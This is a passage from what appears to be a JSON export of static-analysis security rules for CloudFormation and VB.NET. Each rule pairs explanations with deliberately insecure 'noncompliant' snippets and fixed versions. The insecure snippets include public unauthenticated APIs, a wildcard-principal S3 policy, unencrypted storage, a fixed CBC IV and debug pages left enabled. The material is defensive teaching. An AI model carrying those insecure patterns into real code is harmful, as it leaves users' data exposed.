that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nAWSTemplateFormatVersion: 2010-09-09\n\nResources:\n  # Update Lambda code\n  lambdaUpdatePolicy:\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n      ManagedPolicyName: lambdaUpdatePolicy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - lambda:UpdateFunctionCode\n            Resource: \"arn:aws:lambda:us-east-2:123456789012:function:my-function:1\"\n</pre>\n<h3>How does this work?</h3>\n<h4>Principle of least privilege</h4>\n<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted\nenough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>\n<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy\nwith overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.\nIn this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv\">Policies and permissions\n  in IAM: Grant least privilege</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Rhino Security Labs - <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\">AWS IAM Privilege Escalation -\n  Methods and Mitigation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-269 - Improper Privilege Management</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cloudformation:S6319": {
        "name": "Using unencrypted SageMaker notebook instances is security-sensitive",
        "htmlDesc": "<p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker\ninstances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries\nphysically access the storage media, they cannot decrypt encrypted data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The instance contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by\nSageMaker, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html\">AWS::SageMaker::NotebookInstance</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Notebook:  # Sensitive, encryption disabled by default\n    Type: AWS::SageMaker::NotebookInstance\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html\">AWS::SageMaker::NotebookInstance</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Notebook:\n    Type: AWS::SageMaker::NotebookInstance\n    Properties:\n      KmsKeyId:\n        Fn::GetAtt:\n          - SomeKey\n          - KeyId\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html\">Protect Data at Rest Using Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6333": {
        "name": "Creating public APIs is security-sensitive",
        "htmlDesc": "<p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>\n<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks\nboth on the functionality provided by the API and its infrastructure.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, prefer limiting API access to a specific set of people or entities.</p>\n<p>AWS provides multiple methods to do so:</p>\n<ul>\n  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>\n  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>\n  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>A public API that doesn’t have access control implemented:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleMethod:\n    Type: AWS::ApiGateway::Method\n    Properties:\n      AuthorizationType: NONE # Sensitive\n      HttpMethod: GET\n</pre>\n<p>A Serverless Application Model (SAM) API resource that is public by default:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleApi: # Sensitive\n    Type: AWS::Serverless::Api\n    Properties:\n      StageName: Prod\n</pre>\n<h2>Compliant Solution</h2>\n<p>An API that implements AWS IAM permissions:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleMethod:\n    Type: AWS::ApiGateway::Method\n    Properties:\n      AuthorizationType: AWS_IAM\n      HttpMethod: GET\n</pre>\n<p>A Serverless Application Model (SAM) API resource that has to be requested using a key:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleApi:\n    Type: AWS::Serverless::Api\n    Properties:\n      StageName: Prod\n      Auth:\n        ApiKeyRequired: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html\">AWS Documentation</a> -\n  Controlling and managing access to a REST API in API Gateway </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cloudformation:S6252": {
        "name": "Disabling versioning of S3 buckets is security-sensitive",
        "htmlDesc": "<p>S3 buckets can be in three states related to versioning:</p>\n<ul>\n  <li> unversioned (default one) </li>\n  <li> enabled </li>\n  <li> suspended </li>\n</ul>\n<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3\nbucket.</p>\n<p>It can lead to unintentional or intentional information loss.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<p>Versioning is disabled by default:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"Example\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>Versioning is enabled:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Compliant\n    Properties:\n      BucketName: \"Example\"\n      VersioningConfiguration:\n        Status: Enabled\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html\">AWS documentation</a> - Using versioning in S3 buckets </li>\n</ul>",
        "severity": "MINOR"
      },
      "cloudformation:S6275": {
        "name": "Using unencrypted EBS volumes is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the\nsecurity of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access\nto the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a\nhref=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\">all new volumes and snapshots</a>. Volumes created\nfrom snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The disk contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no\nfurther modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption\nglobally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security\nparameter will prevent any future unexpected security downgrade.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html\">AWS::EC2::Volume</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Ec2Volume:\n    Type: AWS::EC2::Volume\n    Properties:\n      Encrypted: false  # Sensitive\n</pre>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Ec2Volume:\n    Type: AWS::EC2::Volume  # Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html\">AWS::EC2::Volume</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Ec2Volume:\n    Type: AWS::EC2::Volume\n    Properties:\n      Encrypted: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html\">Amazon EBS encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6330": {
        "name": "Using unencrypted SQS queues is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store\nmessages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message\nfrom the file system, for example through a vulnerability in the service, they are not able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The queue contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html\">AWS::SQS::Queue</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Queue:  # Sensitive, encryption disabled by default\n    Type: AWS::SQS::Queue\n    Properties:\n      DisplayName: \"unencrypted_queue\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html\">AWS::SQS::Queue</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      DisplayName: \"encrypted_queue\"\n      KmsMasterKeyId:\n        Fn::GetAtt:\n          - TestKey\n          - KeyId\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\">AWS Documentation</a> -\n  Encryption at rest </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6332": {
        "name": "Using unencrypted EFS file systems is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be\nautomatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are\nnot able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file system contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html\">AWS::EFS::FileSystem</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Fs:  # Sensitive, encryption disabled by default\n    Type: AWS::EFS::FileSystem\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html\">AWS::EFS::FileSystem</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Fs:\n    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">AWS Documentation</a> - Data encryption in Amazon EFS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6270": {
        "name": "Policies authorizing public access to resources are security-sensitive",
        "htmlDesc": "<p>Resource-based policies granting access to all users can lead to information leakage.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The AWS resource stores or processes sensitive data. </li>\n  <li> The AWS resource is designed to be private. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the\ncontext of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>\n<h2>Sensitive Code Example</h2>\n<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3BucketPolicy:\n    Type: 'AWS::S3::BucketPolicy' # Sensitive\n    Properties:\n      Bucket: !Ref S3Bucket\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS: \"*\" # all principals / anonymous access\n            Action: \"s3:PutObject\" # can put object\n            Resource: arn:aws:s3:::mybucket/*\n</pre>\n<h2>Compliant Solution</h2>\n<p>This policy allows only the authorized users:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3BucketPolicy:\n    Type: 'AWS::S3::BucketPolicy' # Compliant\n    Properties:\n      Bucket: !Ref S3Bucket\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS:\n                - !Sub 'arn:aws:iam::${AWS::AccountId}:root' # only this principal\n            Action: \"s3:PutObject\" # can put object\n            Resource: arn:aws:s3:::mybucket/*\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "vbnet:S3329": {
        "name": "Cipher Block Chaining IVs should be unpredictable",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports System.IO\nImports System.Security.Cryptography\n\nPublic Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)\n    Dim aes = New AesCryptoServiceProvider()\n\n    Dim iv = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}\n    Dim encryptor = aes.CreateEncryptor(key, iv) ' Noncompliant\n\n    Dim cryptoStream = New CryptoStream(target, encryptor, CryptoStreamMode.Write)\n    Dim swEncrypt = New StreamWriter(cryptoStream)\n\n    swEncrypt.Write(dataToEncrypt)\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports System.IO\nImports System.Security.Cryptography\n\nPublic Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)\n    Dim aes = New AesCryptoServiceProvider()\n\n    Dim encryptor = aes.CreateEncryptor(key, aes.IV)\n\n    Dim cryptoStream = New CryptoStream(target, encryptor, CryptoStreamMode.Write)\n    Dim swEncrypt = New StreamWriter(cryptoStream)\n\n    swEncrypt.Write(dataToEncrypt)\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/329\">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers.</p>\n<p>The .Net Core framework offers multiple features which help during debug.\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in\nproduction.</p>\n<p>Use <code>If env.IsDevelopment()</code> to disable debug code.</p>\n<h2>Sensitive Code Example</h2>\n<p>This rule raises issues when the following .Net Core methods are called:\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,\n<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>\n<pre>\nImports Microsoft.AspNetCore.Builder\nImports Microsoft.AspNetCore.Hosting\n\nNamespace MyMvcApp\n    Public Class Startup\n        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)\n            ' Those calls are Sensitive because it seems that they will run in production\n            app.UseDeveloperExceptionPage() 'Sensitive\n            app.UseDatabaseErrorPage() 'Sensitive\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nImports Microsoft.AspNetCore.Builder\nImports Microsoft.AspNetCore.Hosting\n\nNamespace MyMvcApp\n    Public Class Startup\n        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)\n            If env.IsDevelopment() Then ' Compliant\n                ' The following calls are ok because they are disabled in production\n                app.UseDeveloperExceptionPage()\n                app.UseDatabaseErrorPage()\n            End If\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "vbnet:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nFor Each entry As ZipArchiveEntry in archive.Entries\n    ' entry.FullName could contain parent directory references \"..\" and the destinationPath variable could become outside of the desired path\n    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName))\n    entry.ExtractToFile(destinationPath) ' Sensitive, extracts the entry to a file\n\n    Dim stream As Stream\n    stream = entry.Open() ' Sensitive, the entry is about to be extracted\nNext\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nConst ThresholdRatio As Double = 10\nConst ThresholdSize As Integer = 1024 * 1024 * 1024 ' 1 GB\nConst ThresholdEntries As Integer = 10000\nDim TotalSizeArchive, TotalEntryArchive, TotalEntrySize, Cnt As Integer\nDim Buffer(1023) As Byte\nUsing ZipToOpen As New FileStream(\"ZipBomb.zip\", FileMode.Open), Archive As New ZipArchive(ZipToOpen, ZipArchiveMode.Read)\n    For Each Entry As ZipArchiveEntry In Archive.Entries\n        Using s As Stream = Entry.Open\n            TotalEntryArchive += 1\n            TotalEntrySize = 0\n            Do\n                Cnt = s.Read(Buffer, 0, Buffer.Length)\n                TotalEntrySize += Cnt\n                TotalSizeArchive += Cnt\n                If TotalEntrySize / Entry.CompressedLength &gt; ThresholdRatio Then Exit Do    ' Ratio between compressed And uncompressed data Is highly suspicious, looks Like a Zip Bomb Attack\n            Loop While Cnt &gt; 0\n        End Using\n        If TotalSizeArchive &gt; ThresholdSize Then Exit For       ' The uncompressed data size Is too much for the application resource capacity\n        If TotalEntryArchive &gt; ThresholdEntries Then Exit For   ' Too much entries in this archive, can lead to inodes exhaustion of the system\n    Next\nEnd Using\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be 